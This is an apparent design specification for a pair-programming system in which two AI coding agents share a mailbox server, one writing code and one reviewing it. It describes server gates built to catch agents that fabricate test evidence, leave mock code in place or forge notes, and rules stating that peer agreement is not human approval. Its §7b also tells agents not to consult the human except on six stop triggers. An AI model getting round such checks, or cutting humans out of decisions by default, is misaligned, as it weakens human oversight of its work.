# Pair Programming Protocol

Two agents, different CLIs, one project, one task at a time. One writes, the other
breaks it on purpose. This document is the contract between them. It is short on
purpose: a rule is either enforced by the server, or it deserves the agent's
attention. Anything not here is not a rule.

See also `AGENTS.md` — that is the shape of the pair. This file is the part that
must not drift apart from the code.

> Language: this is the English original. The Russian mirror is
> [`PROTOCOL.ru.md`](./PROTOCOL.ru.md).
>
> **English is the default for everything the system writes** — code, comments,
> docstrings, commit messages, PR bodies, round cards, backlog cards. Russian
> (or any other language) is used only where the human explicitly asked for it,
> or where a file is already a deliberate mirror, like `PROTOCOL.ru.md` and the
> `*.ru.md` docs. Human-facing conversation stays in the human's language; a
> track-only file never does by default.

---

## 1. Exactly one writer

One role holds write authority. It edits files, runs tests, commits. The second is
read-only: it reads, searches, proposes patches.

### How the holder is chosen

`pair_claim(reason="...")`. Whoever took it writes; the other reviews. It is a race
and stays one: to choose deliberately rather than by click speed, both roles would
have to read the task and the code, and nobody waits for that.

But a race without an argument is just a queue. So the claim carries a `reason`: one
sentence on why it is you. It lands in the transcript, in `pair_state`, and **in the
peer's refusal** — the peer sees the other argument and may disagree with it.

Role names in the examples are the concrete pair `opencode` + `agy`. In any other
pair the names carry the same meaning but are their own: writer — `<writer>`, second
— `<critic>`. A role equals the CLI name and is baked in at install time; duo mode
derives an instance of it (`agy` → `agy-writer`) and refuses anything else.

```
<writer>:  pair_claim(reason="I already found where to fix it: retry in the client")
<critic>:  write authority is held by 'codex',
           which claimed it because: I already found where to fix it: retry in the client
```

From there the critic has two honest paths, neither involving the human:

- `pair_send` — name what it disagrees with, with `file:line`. The holder may change
  its mind and hand over authority itself.
- Agree, and work as the critic.

Neither path takes authority away from an active holder. A claim succeeds when authority is free or stale: released, a closed round (`closed_at` or phase `done` — the claim reopens it at `implement` with `round + 1`), an abandoned writer (closed round plus silence past `PAIR_STALL_SECONDS`), the standing policy naming the claimant (`by_policy` — on a free slot, or when the holder is dead: its process is gone AND tmux no longer has its panel), or any live role taking over a dead holder when no policy pins the claimant (rather than idling over a corpse).

### Standing arrangement: writer-pin

The standing arrangement pins **only the writer** (`bin/pairctl roles --writer X`).
The critic is not pinned: it is any second live role in the roster, so a CLI whose
limits ran out is swapped with `pairup --swap <cli>` and no paperwork — writer and
authority untouched. `--critic` is accepted and ignored with a warning (old calls
keep working); `--swap` moves the writer to the second live role from the roster.
Enforced by the server:

- `pair_claim` is refused while authority is held
- `pair_patch_reserve` is refused to the holder — it edits directly and does not need
  the mechanism
- `pair_patch_verify` and forward `pair_advance` are available to the holder only

`pair_task` is the exception to read-only, and it is deliberate: anyone may **add** a
task, only the writer may close one. See §5c.

## 2. Only the human moves authority

`bin/pairctl assign` and `bin/pairctl release`, and nowhere else.

**A peer's message does not transfer authority** — neither to grant it, take it, nor
borrow it for one edit. No agent tool writes `writer`.

Change the writer mid-task:

```sh
bin/pairctl release
bin/pairctl assign <role>      # the peer's role: agy, codex, claude — whatever your project uses
```

Say it in both panes, who writes now. The previous writer stays read-only even after
being interrupted and resumed: a revoked writer does not remember having been one.

There is a nuance easily mistaken for a violation: **the holder may hand authority
over itself.** `pair_release(why="...")` is its own decision, not a transfer by
message. An agent cannot take authority from another, but the holder may give it
away — and given authority cannot be taken back, because it is then free and
available to a new `pair_claim`.

Who writes, and what they claimed:

```sh
bin/pairctl why          # across all projects
bin/pairctl status       # in the current project, JSON
```

A script may not do this. `bin/pair-duo` used to run `pairctl assign` on its own, silently moving the trust boundary on every run; now it leaves authority alone unless no standing arrangement and no current writer exist, and says so out loud. The default pair is two *different* CLIs; `bin/pair-duo <cli>` runs two copies of the SAME CLI under derived roles (`<cli>-writer`, `<cli>-critic`).

Swapping the critic's CLI (`pairup --swap <cli>`, `pair-duo --swap-critic`) is not
moving authority: the writer keeps writing, only the reviewer's process changes.
That is why it needs no `assign` and no human word — §2 guards who writes, not who
reviews.

## 3. A read-only agent proposes patches, it does not apply them

One command (preferred):

```
pair_propose(files=["a.py", "b.py"], subject="what it fixes")
# the server builds the diff itself, seals it, and delivers path+hash
# to the writer via pair_send with expects_reply
```

Manual path (legacy, for exotic cases — e.g. a diff assembled by hand):

```
pair_patch_reserve        # empty file 0600, exact path
# write a unified diff into that path
pair_patch_seal(path)      # the server computes and records the SHA-256
# active delivery straight into the writer's composer for immediate continuation:
pair_deliver(to="<writer>", text="patch at <path> sha256 <hash> — what it fixes, apply and continue")
# if the composer is busy — pair_send into the mailbox
```

The writer:

```
pair_patch_verify(path)    # recompute; mismatch — stop
pair_patch_applied(path, ok=True, note="commit abc1234")
```

- **Mismatch is a stop.** The patch changed after sealing. Do not apply it, ask for
  a reprint. This is the only protection against substitution between proposal and
  application.
- Copy the patch **once**, work on the copy.
- **Re-verify immediately before applying**, not at the start of review.

Both roles delete their files via `pair_patch_release` by **exact path**. Never a
glob: the directory is shared, and a patch you cannot see gets deleted with its own.

After an interruption — check whether the file is still there, and delete it by exact
path.

## 4. "The peer agreed" is not the human's approval

The most dangerous phrase in the system. It can be quoted, and it means nothing.

- An agent may say the peer agreed.
- An agent may not say that the action is therefore approved by the human (when the
  subject is authority transfer, or the six §12 stop triggers).
- No agent answers for the user: it does not grant rights in their name, does not
  touch secrets or production.

**Routine development is still autonomous:** agents do not ask the human for
permission to apply a patch, run tests, commit, or move phases. If the critic sealed
a patch, the writer applies it and continues without asking.

## 5. A round cannot close over unread mail

`pair_advance("done")` is refused while unread messages sit in the caller's inbox.

A report the writer did not read is not a report.

### 5a. A round cannot close without proof

`pair_evidence(kind, value, ok)` records an agent-reported fact about the current
round (self-declared by the agent — the close gate trusts the report, it does not
re-run the suite): the test suite with its count and exit code, lint, typecheck, a diffstat, a
commit, a PR URL. Kinds: `test`, `lint`, `typecheck`, `build`, `diff`, `commit`,
`pr`, `manual`, `ground-truth` (see §5d).

Evidence blockers apply in every autonomy level, including `observe`, and refusal wording never names a level as the reason: `semi` only *adds* the human's word (`pairctl ok`) on top.

In every mode a round cannot close while:

- there is no passing evidence for the current round;
- the last run of any kind failed;
- there is no passing `test` **from the writer** (in `mode=fix`, see below);
- there is no passing `ground-truth` **from the writer** (in `mode=fix`, see §5d).

Per kind, the **last** run decides: tests failed → fixed → ran again, and the round
may close. `ok=false` is not a confession of failure but a record that holds the
round open until it is fixed or explained in a note.

Why the writer requirement: the gate exists to stop a round closing on an opinion.
Accepting `kind="test", ok=true` from a role that cannot run tests would close that
gate with the same words it was built to reject. In `mode=audit` the test requirement
does not apply — there the deliverable is findings, not a diff.

Evidence belongs to the round it was gathered in. What proved round 3 says nothing
about round 7, otherwise the gate becomes a sticker from the very first round.

Current-round records are never evicted from the journal. The closing gate reads
state, not the transcript, so an evicted failure would simply stop counting — a
round with red tests would close because the journal filled up. Older rounds are
still trimmed, or state would grow without bound.

Why any of this is needed: 78–96% of stated model confidence is exactly 100%. "The
critic is happy" is not a signal and must not reach `done`.

### 5d. Ground-truth: claims are checked against the tree, not memory

Green unit tests once certified an unconnected UI: the browser still served a
static collection while buttons sent hardcoded mock ids (round 81). The contour
below makes that class of fiction machine-checkable. Chain, in order:

1. **Tree facts** (`mcp/pair_mailbox/session_facts.py` → `.pair/tree-facts.json`):
   deterministic snapshot — head, `dirty_hash`, touched/untracked paths, added-line
   mock flags, AST `stub-body` flags (empty `pass` / `...` / `raise
   NotImplementedError` bodies, `@abstractmethod` excluded), recorded test runs.
   The file is its own: the facts anchor (§9c) writes `.pair/facts.json`, a
   different shape. The two shared one file until round 137, and each wiped the
   other — the close ritual runs this collector every round, so the anchor was
   empty by the next morning.
2. **Rules** (`anti-mock.json`, versioned at the repo root): regex patterns plus
   the `detect_stubs` switch. Missing or broken file falls back to the strict
   built-in default; the file itself is gate-exempt (it describes the check).
   `pairup` copies the template into every new project.
3. **Verdict** (`mcp/pair_mailbox/anti_mock_gate.py`): combat paths block,
   test paths warn, `local-state` goes to the critic. Exit 1 on blockers.
4. **Summary** (`mcp/pair_mailbox/round_summary.py` → `summary.json`): aggregates
   facts + `ledger.jsonl` slices + verdict. Only composes, never invents; emits
   the `files`/`tests` keys the gate reads.
5. **Gate** (`scripts/verify-ground-truth.py`): every claimed file and test run
   must exist in the tree facts; head and `dirty_hash` must match. Any mismatch
   blocks (exit 1), including a lying summary that claims files git never saw.
6. **Receipt** (`mcp/pair_mailbox/receipt.py`): `done` refuses to write
   `.pair/RECEIPT-<round>.md` while combat mocks stand (`GroundTruthBlocked`).

The `done` gate requires `pair_evidence(kind="ground-truth")` from the writer in
`mode=fix`, same standing as `kind="test"`: another role's run is not a
substitute, and in `mode=audit` the requirement does not apply.

### 5b. A patch without an application holds the round open

`pair_patch_applied(path, ok, note)` — writer only, after a successful
`pair_patch_verify`, records the outcome. Before this verb existed, `applied` was set
at reserve time and never flipped, so "applied" and "sitting untouched since last
night" looked identical and a round closed quietly over a proposal nobody had
touched.

`ok=false` (a rejected hunk) counts as unresolved. To drop a patch deliberately is
`pair_patch_release`, which lands in the transcript as `patch_dropped`: "dropped" and
"forgotten" are different things, and the report must tell them apart.

**The writer may drop a patch they did not propose**, while it is still unresolved.
Otherwise the deadlock is real: the proposer may have gone away, `pair_patch_applied`
requires `verified_match` that a deleted file can no longer give, and nobody is left
who may remove the record. Every writer-side drop carries `released_by_writer`,
because "the author dropped it" and "the writer dropped it" are different facts. An
already-applied patch is not unresolved and may not be dropped.

A patch file deleted outside the server leaves the record behind; `pair_patch_release`
clears it, and does not need the file to exist.

### 5c. A round cannot close over an open task

`state["tasks"]` is a list, and `pairctl task "..."` appends to it rather than
overwriting. This exists because the state used to hold a single `task` string, and a
new task silently erased the old one: reproduced live, a round closed labelled with
task B carrying the tests and `ok` gathered for task A.

| | tool |
|---|---|
| add | `pair_task(action="add", text=...)` — anyone, including the critic |
| read | `pair_task(action="list")`, or `pairctl task` |
| close | `pair_task(action="done", id=N)` — writer only |
| drop | `pair_task(action="drop", id=N, reason="why not")` — writer only, reason required |

Rights are asymmetric on purpose. The critic must be able to say "I found this too"
without writing into someone else's notes, but implementing it is the writer's job,
so only the writer closes. An empty reason is refused: a task that vanishes silently
is the exact failure the list exists to prevent.

The list answers with the OPEN window, not with the whole history. Measured on a live
room, the full list of 137 tasks cost 29 784 tokens per call to say that one task was
open — the largest single token sink in the room. `pair_task(action="list")` returns
the open tasks, the counts (`open`/`done`/`dropped`/`total`) and `next_id`; the whole
history is behind `scope="history"`, with `limit`/`offset` for paging. The default
answer says how much it left out (`hidden`), so a short list is never mistaken for a
short round.

A round will not close while any task is `open`. The human can also do it: `pairctl
task --done N`, `pairctl task --drop N --reason "..."`.

`.pair/tasks.md` is generated from state and never hand-written, so it cannot drift
from the facts: per task, who added it, who closed it, why it was dropped, and the
evidence recorded against it. A dropped task with no reason prints as a defect rather
than passing quietly. `pairctl tasks` regenerates it and prints it; the pilot writes
it beside the round report.

Evidence records the task it proves when exactly one task is open, and stays
unattached with a snapshot of what was open when several are — the journal prints
those separately rather than guessing.

#### The subject line is derived, never the raw string

`state["task"]` is the legacy scalar: only the human's `pairctl task "..."` writes it,
and nothing rewrites it when a round advances, so it can only go stale. It therefore
never poses as the current subject. Every surface that shows the subject —
`pair_state.task`, `pair_digest`, the board snapshot, `pairctl status` — reads one rule,
`task_subject.subject_line`:

- the scalar names its own round → it is the subject;
- otherwise the first open task speaks for the subject;
- otherwise the stale scalar travels, marked `(stale — not round N)`;
- nothing set → empty, never a guess.

Round 103 shipped with the scalar still reading "Round 98: …" while round 103 worked,
because the guard for this existed in `digest` alone since round 98 and the other three
surfaces never had it — the one-surface-guard failure, which is why the rule now lives
in one module and four surfaces import it. `pairctl status` prints the raw scalar and
the derived subject side by side, so the drift is visible to the human instead of
silently resolved for them.

## 6. Stepping a phase back is open to both

Forward is the writer's. **One step back is anyone's:**

```
plan      → scoping     anyone
done      → implement   anyone
verify    → implement   anyone
implement → plan        anyone
```

This is the critic's veto, and it requires no write authority. Rounds close on the
finding the critic made after `done` — before, he was locked in a closed round and
his finding died in the mailbox.

Stepping back from `done` increments `round` and clears `closed_at`.

### The plan gate: `plan → implement` is machine-checked

Forward from `plan` to `implement` is refused by the server until the round has a
plan artefact and the neighbour's visa (round 55):

- **`​.pair/plan.md`** — the contract. First line is strictly `round: N` (N is the
  current round), then the sections `Goal`, `Invariants`, `Acceptance`. The marker
  exists for the same reason a stale verdict is refused: applying last round's plan
  silently is worse than having none.
- **The neighbour's visa** — any note containing `plan-ack round N`, written by
  any role but the writer (your own visa is refused: that would be the gate
  removing itself), not older than the plan file. The visa is CONTENT: the note's
  file name is not part of the rule, and the gate reads every `notes/*.md` file —
  a visa written to `notes/plan-ack.md` counts exactly as one written to
  `notes/verdict.md`. In `mode=fix` only.
- **The waiting window** — `.pair/plan-gate.json` `{"ack_timeout_hours": 24}`: when
  the window expires and the writer has no open requests to the neighbour, the
  transition is allowed. An open request stops the clock — a remark nobody answered
  must not expire unnoticed.
- **Exempt**: every step back (including reopening `done → implement` after a
  finding — a gate that blocked reopening would lock itself), and `mode=audit`,
  where the deliverable is findings and an artefact is enough without a visa.

The gate is additive to §5a: it does not replace the evidence requirement, and it
does not touch the writer-only rule (§6 forward belongs to the writer regardless).

## 7. A live channel: the agent waits, it does not sleep

**The rule that makes the pair work: a turn ends with a bounded `pair_read`.**

Not as a preference — as the mechanism. Nothing can wake an agent that is not calling
any tool, and **no agent tool exists in any MCP implementation that can inject a turn
into another agent's client**: MCP is client-driven, so a server answers requests and
cannot push a new turn into the host. The mailbox is the only universal channel, and
reading it is the only universal wake-up.

That is why `pair_read` is a bounded wait rather than an instant read. An agent that
ends its turn with `pair_read(wait_seconds=N)` is never idle *with unread mail*: it is
either reading, or it already has the message. The cost is latency — the agent waits
instead of exiting. The alternative costs the round its night.

**One read per turn.** The turn ends with that read; it does not begin another. An
empty answer means nothing new arrived, and reading again buys nothing: the peer and
the supervisor wake the agent when the mail lands. Every poll costs a full context, so
a loop of them costs the round its night — measured 2026-10-19 on one pair: 29k polls
a day, each a full context for nothing. A read that would replay a batch the agent
already holds therefore spends its whole budget before answering, and the answer names
what is waiting: `must_ack` and `letters_behind`.

**Delivery ends at the ACK (round 101).** A `pair_read` batch is persisted with
its token before the answer goes out; it stays unread until the agent passes
that exact `ack_token` on a later `pair_read`. A retry without the token replays
the SAME letters under the SAME token — at-least-once, never lost and never
silently skipped. One unreadable or shifted file wedges its OWN batch (named in
`pair_state` and the digest, curable with `pairctl read-ack`), never the role's
mail flow: letters after the hole keep draining. `seen` remains a contiguous
prefix by design; fresh-below-poison acks are recorded as runs and folded in
when the hole closes.

Delivery is the second path, and it is best-effort by nature:
- **`pair_deliver`** — active: types into the peer's pane and presses Enter.
- **`pair_send`** — passive: drops into the mailbox, which always works.

`pair_deliver` cannot be relied on. It needs the peer's composer to be visible, and a
full-screen TUI hides it: on OpenCode the capture holds only frames and a status line,
so delivery refuses with "composer not visible" and the message falls back to the
mailbox. The refusal is correct — typing into an unseen pane would send the text into
`vi`, `less` or a running build.

So the split is: **the mailbox is the guarantee, delivery is the accelerator.** A
wake-up adapter per CLI is allowed to exist, and the table below says so honestly; but
nothing may depend on one.

The table names the adapters the code SHIPS, not the ones it could grow. The pilot's
`WAKE_ADAPTERS` (`bin/pairpilot`) has exactly one entry — `opencode` →
`mcp/pair_mailbox/wake_opencode.py`, which posts to the host API of the opencode server that
holds the pair's connection — the session that server is serving, checked against this
project's directory. The recorded session id is the fallback, not the primary name.
Every other CLI falls back to the ring: the neighbour's composer gets a doorbell — the
server's own ring shape, `pair: message from pairpilot. Read pair_read.` — and a `tmux
display-message` popup is what a pane that refuses gets, then the mailbox letter. The
popup alone was not enough: tmux draws it in its message area, OUTSIDE the pane's rendered
region, and a full-screen TUI (OpenCode, agy, omp) owns that region and repaints it, so
the wake never reached the agent's screen. The `pair-guard` plugin
(`.opencode/plugins/pair-guard.ts`) is NOT a wake path
— it refreshes the authority brief inside the agent's own system prompt when the shared
state changes, and it pushes nothing into an idle session. A row claiming an adapter the
pilot cannot call sends the operator looking for a wake path that does not exist, so the
table is guarded by a test against the pilot's own map.

| CLI | adapter | if unsupported |
|---|---|---|
| OpenCode (`opencode`) | host API — `wake_opencode.py` | doorbell, then popup, mailbox still delivered |
| Antigravity (`agy`) | none | doorbell, then popup |
| Claude (`claude`) | none | doorbell, then popup |
| Codex (`codex`) | none | doorbell, then popup |
| Pi (`pi`) | none | doorbell, then popup |
| OMP (`omp`) | none | doorbell, then popup |

The supervisor nudges a role that has unread mail and has gone quiet — once per unread
batch, not every tick, recorded as `pilot_unread_nudge` (with `how`: `ring` when the
doorbell landed, `queue` when the text waited for a free composer). Reading resets the
nudge, so the next letter wakes again; a hanging `expects_reply` repeats every 2h until
answered. One letter produces ONE message in the peer's pane: the doorbell and the
queued push are two doors to the same peer, and the ring that lands takes the queue's
place. That nudge goes through the same unreliable delivery, so treat it as
best-effort. The pull is what actually works.

### 7c. Two gates in front of the supervisor's typing

A push is the one irreversible thing the supervisor does: it types text into another
window. Round 114 measured what happens without a gate in front of it — galatour lost all
three agents, their panes lived on as plain bash, and the pilot typed the same "you have
unread mail" nudge into that shell every 15 seconds for 19 hours: 1314
`pilot_deliver_unverified` rows, 97 `[pairpilot]: команда не найдена` lines on screen, and
not one nudge anyone could read. The human's verdict on that state was that the system was
broken, and a state nobody can read and nobody can disprove is exactly that.

So `Pilot.nudge` is the door every spontaneous REPORT passes, and it holds two gates
(`bin/pairpilot`):

1. **The role's own CLI is there.** `push_target_alive` asks `pane_role_pid` — is
   `server.py --role <role>` running among the pane's descendants. A live pane proves a
   shell sits in it, never that the role does. False means one `pilot_push_dead_role` row
   and silence: text typed into a shell is executed, not read.
2. **There is a reason.** `push_allowed` reads the `.pair/ask` file. Creating it is the
   trigger: a human who wants the pair woken, a hook, an agent. Consumed once spent
   (`consume_trigger`), so it cannot re-arm itself. No file means quiet by default.

The RING is the second door, and it is narrower than the nudge on purpose. It is a
doorbell: it types a CAUSE into the neighbour's composer (`pair: message from pairpilot.
Read pair_read. (1 unread)`) and never the letter, never the report. It answers "you are
not alone in here", and the peer reads the mailbox itself. Its guards are the physical
ones — the role's own CLI in the pane, the pane provably ours, the composer visible and
free — plus a five-minute throttle per role; the ask trigger is NOT its gate, because a
cause is not a report and does not spend the trigger. The report text stays behind the
trigger exactly as before. A doorbell that cannot land (a busy composer, a pane that is
not ours, a shell where a CLI used to be) falls back to the tmux popup and leaves the
wake file to the escalation ladder.

The pilot's own leftovers are cleaned up: the doorbell wears the server's ring shape, so
`pointers.own_pointer_length` recognises it, and the pilot erases its own before typing
again. Anything else in that composer is somebody else's and stays untouched.

The mailbox path needs neither gate and is unaffected: the pull is the guarantee, the push
is the accelerator.

Reading a fact is not a push. `startup_brief` runs once per round and phase and states what
the session walks into — phase, writer, open tasks, unread count, sealed-but-unapplied
patches — to the console and the journal, never into a composer. An interrupted round is
therefore said exactly once, in words a human can read, instead of arriving as an
endless stream of nudges about nothing.

A queue's lifetime is about its text, not about the last write. `enqueue` stamps the first
queueing of each distinct text in `pilot/.<role>.txt.queued-at`, and `queued_age` reads
that stamp, so a rewrite cannot keep a dead pointer alive forever and the mailbox fallback
fires exactly once.

Two ways to send, then:

`pair_read(wait_seconds=N)` is the normal way to hear from your peer. **One read per
turn.** Empty — nothing new arrived: get back to work (or sleep); the peer and
the supervisor wake you when the mail lands. The ceiling is 60 seconds; when
time is up, get back to work.

The answer is honest about the wait and about the wedge. `waited_seconds` is the
time the call really took, `wait_budget_seconds` what it was allowed to take: a
read that would replay a batch you already hold spends its whole budget before
answering, so a confused agent cannot spin on the same batch. `must_ack` says
the batch is still unacknowledged, and `letters_behind` counts the letters that
arrived after it and wait behind it — reading again will not bring them,
acknowledging will.

Both roles may wait. A bounded wait cannot deadlock: it always expires and returns
the agent to its task.

The writer was once forbidden to wait at all, to rule out a deadlock. That killed the
channel: an agent that cannot wait falls asleep and never notices incoming messages,
and the human starts relaying them by hand. A live wait is part of the protocol, not
an optimisation.

**The server must not promise more than the client can sit through.** The effective
wait is the minimum of the protocol ceiling and the client's own budget
(`PAIR_CLIENT_TIMEOUT`, default 20000 ms) minus a 5s margin. When the client's timeout
is cut, the answer says so: `wait_capped_by_client_timeout`, the timeout, the
ceiling. Silence about it is the expensive part — an agent that cannot tell "nobody
answered" from "I was disconnected" draws a conclusion about its peer instead of
about its own client. The MCP `timeout` in `cli-profiles.json` must therefore exceed
`MAX_READ_WAIT_SECONDS`, and a test fails the suite if any profile does not.

## 7a. No manual relay: agents talk to each other directly

Agents are strictly forbidden to ask the user to relay messages, signals or prompts
into the neighbouring terminal window (for example: *"there's a request waiting in the
opencode window, please send it your confirmation..."*).

Such a conclusion grossly violates the contract of autonomous pair work:
1. To signal and wake the peer there is **`pair_deliver`** — an optional nudge:
   one short pointer line into the peer's active tmux input, never the full text.
   The text lives in the mailbox; the peer picks it up with `pair_read`.
   Delivery is best-effort (a busy composer refuses rather than overtypes),
   so the mailbox is the mandatory path and delivery is not.
2. For background exchange there is `pair_send` and `pair_read`.
3. The user gives the task at the start and accepts the finished PR at the end. The
   human is not a router between windows.

## 7b. Do not disturb the human: the pair closes the loop itself

Default, not a prompt ornament. Applies in every round unless §12 fires:

- The human is never called: no questions, no "take a look", no "confirm".
  Stuck — write a `pair_note` saying what is blocked and by what, take the
  next step yourself.
- The critic is silent for 15+ minutes — resend `pair_send` with
  `expects_reply` and keep working, the pilot catches them up.
- A critic with no objections does not go silent: a clean review names the
  next piece of work (open tasks, `docs/backlog/`), or says what is done.
- A verdict opens an obligation to the writer automatically — take `done`
  yourself when blockers are zero. Closed the round — take the next card
  from `docs/backlog/` yourself, the writer opens the new round.
- Uncertainty is resolved between the agents (§12): pick an option, record
  a `decision` with the reason, carry on.

Only six things stop the pair and ask the user (§12): secrets, ports,
deploys, migrations, data or history deletion. Everything else is
resolved without them — that is what `auto` means.

## 8. Answer "how's it going?" with a fact

Not "I'll check". Open `pair_state` or `pair_transcript` and say what is **true
right now**: phase, what is done, what is pending. If nothing changed, say that.

A promise to check is a way to spend time without saying anything.

## 9. Notes, not conversation

A conversation is neither shareable nor does it survive a restart. Anything the peer
must know after a context reset goes into a note:

```
plan      what was agreed and in what order
decision  the choice and the reason
finding   checked against the code, with file:line
verdict   the outcome of the check and what it did NOT cover
handoff   what is done, what was skipped, what is unclear
backlog   a real defect outside the task's scope
```

Backlog lifecycle: a critic finding that is real but out of scope goes to a
`backlog` note as `file:line — what breaks — why deferred` (anyone may add).
The writer moves each note into `docs/backlog/<slug>.md` with frontmatter
`title/found/severity/round/status: open`; fixed cards are deleted from
`docs/backlog/` with the fix recorded in the commit message — history keeps
the record, the directory keeps only open debt. The close report
(`.pair/REPORT.md`) lists what was parked this round and the open cards, so
a parked finding cannot die silently.

A note is read by its TAIL, never whole. `pair_note_read` answers with the tail under
a budget in TOKENS (800 by default) — the line budget that stood here before cost
3 166 to 5 122 tokens on the same four notes, because a line of Russian prose is not
a fixed number of tokens — and it says which ceiling bound the answer
(`budget_applied`: `tokens`, `lines`, `record`, `none`). The cut lands on a record
edge, never inside a record. `pair_note_index` lists the freshest notes with the
room's totals (`count`, `total_bytes`, `largest`); the rest of the heap stays behind
`scope="largest"` or a bigger `limit`.

## 9a. Talk before work: the plan goes through the mailbox first

Applies in `mode=fix` only — in `audit` there are no commits, so there is
nothing to hold back.

Before the first commit of a round, the writer sends the plan through the
mailbox: `pair_send` with `expects_reply` and a subject containing `plan`
or `план` (either language). The critic
answers with an objection or an agreement — only then the code. No answer,
no code.

This is a discipline, not a server gate. `_answer_obligations` closes an
obligation on any message in the other direction, even a ping, because
judging content would be guesswork — so a ping that closed the obligation
is not an agreement. The writer waits for a substantive reply, not for the
obligation file to disappear.

Why: rounds used to skip the middle — the writer wrote code at once, the
critic answered with a verdict, and nothing in between was ever discussed
(rounds with empty-subject pings instead of a plan, October 2026).

### 9a-1. Two plans, one meeting (the "miting" rule)

The plan is not announced, it is BUILT. For any task that changes user-facing
behavior, touches more than one file, could break a dependency, or changes a
contract other code calls into — a tool, a fixture, a state file format:

1. **Both agents draft independently.** Each writes its own plan into a
   `pair_note(kind="plan")` BEFORE reading the other's. One agent's plan
   never seeds the other.
2. **Exchange, then critique.** After both plans exist, each reads the
   other's and sends its objections with `file:line` (§9: an objection
   without an anchor is noise).
3. **One agreed plan wins.** The final plan names: the chosen approach and
   why, alternatives rejected and why, edge cases the pair found — and
   LINKS the paths of both draft notes; otherwise "two independent plans"
   is an unverifiable claim, which is exactly what this round treated as
   a defect.
4. **Unknown technology — context7 or web search first.** Before choosing
   an approach that touches a library or API either agent hasn't verified
   against current docs, both agents check the docs via `context7` or
   web search. Guessing API shape from memory is refused by convention.
5. **Impact check before code.** The agreed plan lists: what can break,
   which callers/importers are affected (monorepo cross-links), whether
   rollback is safe (revert single commit), and which tests prove the
   boundary didn't regress.
6. **For user-facing features: an experience checklist.** What a user
   sees on open/close, what updates, what renders if there is nothing
   to show, error-state text, and confirm/cancel wording — written down
   before code, not polished after.
7. **Timebox, not deadlock.** Two exchanges on the plan (each side one
   iteration — exactly the server's MAX_OPEN_REVIEWS=2); disagreement
   after that is resolved by the writer with a recorded `decision`
   note. There is no infinite miting.

In `audit` this section does not apply — there are no commits to plan. In
`fix` the "miting" is a discipline for user-facing work and for cross-file
edits; a one-line doc typo does not need a meeting.

## 9b. Never write into another agent's kind file

A note's kind is its author's namespace. `notes/verdict*.md` is the critic's, a
`backlog` card the writer's, and so on: writing into the other side's kind file
is how a forgery stops being detectable — one hand-written entry among hundreds
of real ones, with no journal row to contradict it.

So neither side writes into a kind file it does not own. `pair_note(kind=...)`
owns its own kind, appends its own role into the header, and records a journal
row beside the entry (`server.py:3518-3528`) — three facts that must agree.

Enforcement: `pair_notes_consistency.check_notes` cross-checks every entry in
`notes/*.md` (header role + note_sha + attempt) against the transcript's note
rows, across the united stream (active `transcript.jsonl` plus
`transcript-archive/N.jsonl`, `manifest.py:56`). An entry with no journal row
is named at close (`server._done_blockers`): it is either a hand-edit or a
foreign write, and a round cannot close over it. The check names and refuses;
it never repairs, because the author must see their own entry.

Corollary invariant, from three instances in one session: a comment claiming
behaviour has a test asserting it, or it is not a claim. `critic_ack`'s "the
newest of each cause" answered the first block seen (round 105 4a);
`pair_notes_consistency`'s "united stream" read an archive path that was always
empty (round 105 4b); round 104's floor names claimed what origin carries while
probing only local refs. Each comment made a promise its tests could not check.

## 9c. The facts anchor: what a context reset must not lose

A compaction in the harness removes about 90 % of the context and leaves 39 513 to
49 131 tokens of prose alive — the summary the agent carries for the rest of the
session. It cannot be queried, diffed or dropped. The pair's own anchor is structured
and small: `pair_facts` keeps key → value records of what the round stands on (the
task, the decision in force, the blocker, the branch) in `.pair/facts.json`, under a
500-token budget. That file is the anchor's own: the tree facts of §5d live in
`.pair/tree-facts.json`. The two shared one file until round 137, and each wiped
the other — the close ritual runs the collector every round, so the anchor was
empty by the next morning.

- any agent may set a fact, like a note; the writer owns the pruning (`drop`,
  `clear`);
- a write that would cross the budget is REFUSED, never trimmed: a silently trimmed
  fact is a fact the writer believes they recorded and nobody else can find;
- the facts travel in `pair_digest`, the cheap orientation, and cost a few hundred
  tokens there;
- the facts survive the round: they are the next round's starting point.

## 10. Git is part of the work

A branch per task, a commit after every green step, tests green as a precondition,
`push` and a PR at the end. **Never push to `main`.**

This is not "a separate explicit user action". An agent that considers the push and
the PR someone else's business leaves the work half done.

### 10a. Round mode: `fix` or `audit`

`bin/pairctl mode fix|audit` — the human decides what the round is for at all.
`fix` by default, and everything above holds as written.

In `audit` the project is deliberately not changed: nobody edits files, creates a
branch, commits, or proposes patches — the server refuses patch reservation and
records the refusal in the audit trail. The work is still real: findings, the peer's
refutation, and whatever is confirmed goes into `docs/backlog/`. In `fix` the fixed
cards are removed from `docs/backlog/` (recorded in the commit). The difference from
`fix` is not that the work is weaker but that its result is evidence rather than a
diff.

Write authority is not cancelled in `audit` — otherwise nobody could move the phase,
and §5 and §6 would still apply. What changes is the subject: the writer does not
commit code, it runs the round, holds the findings in notes, and moves what is
confirmed into `docs/backlog/`.

The mode lives in state, not in the task text. The reason: an agent gets its
instructions from state and its prompt, and those two must not contradict each other
— otherwise the agent that read its own instructions more carefully does the wrong
thing.

### 10b. How far the pair goes alone: `observe`, `semi`, `auto`

`bin/pairctl autonomy observe|semi|auto` (**`auto` by default**). This is a **separate**
axis from `mode`: `mode` answers "what the round does", `autonomy` answers "how far it
goes without the human". Merging them is wrong: `pairctl mode auto` would silently
turn an audit into a code change, because every audit check looks at
`mode == "audit"`.

| | restart a failed agent | confirm permissions | close the round |
|---|---|---|---|
| `auto` (default) | yes | allowlist only | needs proof; no word needed — the round may close itself |
| `semi` | yes | allowlist only | needs proof **and** the human's word: `bin/pairctl ok` |
| `observe` | no | no | needs proof; no human word needed |

Note that `observe` does **not** switch the gates off. An earlier version returned an
empty blocker list at the first line, which made `observe` the one mode where a round
closed with nothing at all — and it looked like a side effect rather than a decision.
`observe` means "do less", not "do not count". Proof is still required in every mode;
only the human's word and the restart differ.

`pair_state` returns `autonomy` and `autonomy_meaning`, plus `closing_blocked_by` —
the list of reasons `done` is impossible right now. An agent must see the reason
before spending a turn on a foregone refusal.

An unknown `autonomy` value (from state written by a newer build) reads as `observe`:
someone else's state must not grant this build more authority than the human asked
for. A **missing** key is different: that is an older state file, not a request for
caution, and it reads as `auto` — the default the human set.

#### 10b.1. Choosing the level once, at launch

The pair is started once and then works unattended until the result is on the table.
The level is chosen at that moment and not renegotiated mid-round, so the human is
asked **at most once** and, in `auto`, not at all.

